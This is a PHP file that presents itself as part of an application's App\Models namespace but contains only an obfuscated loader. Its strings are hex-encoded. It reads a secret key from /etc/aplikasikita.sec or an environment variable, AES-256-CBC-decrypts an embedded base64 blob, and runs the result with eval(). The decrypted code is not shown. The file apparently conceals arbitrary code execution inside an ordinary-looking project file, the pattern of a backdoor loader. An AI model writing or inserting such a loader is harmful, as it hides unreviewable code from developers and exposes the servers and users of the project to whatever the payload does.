<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Df3rpScToPwMIDTBivZVbA==');

$c=base64_decode(

'NXohLmTzaqZsBGVbYF2ME9so5N5qllLn0XJWcTwg4FYKWTy7Tys3egp4QOMzx0EFWqBeTYN/ZC8Y' .
'CTvvtTEEVuEXyO3k0i/BJgququ5ZLI8d+rda0HSNjOmfKnpH3VPAlTfNU6luU25J3fTvKUrb81TV' .
'tdTYE0WNNudiaqSEQX7SmU3qfrz4OLWK6UqRL6BHDyRUcStBo5ar1/XABH+0nX9QmIgyO0H3ll2d' .
'Q7hM0rRDBsPb2HBBmFK5OCyeAxGsKZDRxIrXOLOO0Af0oBc2zyOtimvQo2NnDxjVjvKghvDNoJgd' .
'4yLsI8yt4vKkIrOE9q/Ru3sePAWldMgqYhWR1u2kvEez+WjEWjrDZEOdboS8R3LyiVpCtJB79QmU' .
'nn7ODi2RkoPyXNSs75j/dzBAr8QB8KR8bA2Hm05Jzro9GQb7n/zGVhbXvX/jkqsJuZW8PEAF1hQP' .
'CWUAx7UL49bD2KPk88RrkdegvZQ6CZY2KcRbGMFEWiXwDB69m4pyomGubDcA5JyMoLeS5UdK7NJe' .
'9+5wkcCrO/0DKCCtoQVl/MYK26umP/M8EqnPOLlGyZME7ykJnre94wjy4mZpUJzlOSIjQCAjNe/Y' .
'A2vap3vi8kX/IDc+V2ZerUnbDBZpc7xBOxrZVky35l/fQ7O/WuEwFOScvhV0R4WTF95dsg+76rut' .
'Tpoy3PT0It5++QInsPZmwNEE8iXOeEuBnpUAHnaQInMSbhvlpEDeGWxiqx925S9dH8Ktkso4dR3D' .
'2BIZ/Xl5wT0bndX/1x/M/21LTXyEeX78D9FWgqefRRR2HAn2WTxyyX+EgdVIP7jP+WzJW94ig5wE' .
'KMUy8mH7/0hHPt3vGQ7tyIemNNdji7u82JfP64cnrap2U8IxD6hgXuTFYki2fxqJybMOSxUBT/GV' .
'26XWHmWcBtvzoOjy9/E/X2CJtn1hi9IyDhMbtcgdiB+7kc3R/U3VJuepOQvY0USOhNy0sJmACeLx' .
'P+9lRTcsbJlOh6IFy6pOSfqOhmXfcqNKDqNyCCACHxmAL5tEtd8v6sR/ZxnvsIBxawpqzFSX0GKX' .
'4OeJnExv3Ri/A5RZWERoSr/MdIXGGH/4g376NnlSknWqgLchCDt2wtdw3Npj6hPH0QXeNJi11ma3' .
'l/JfJLYzZjD+hWULIpnFxcLEp40F7bWZOozy8cUYMqJN2NHi2nc/vIFt+Yk9OhRWX5IPYKilWhd+' .
'+4TwxUD2bF40J4FHh3lh9A=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

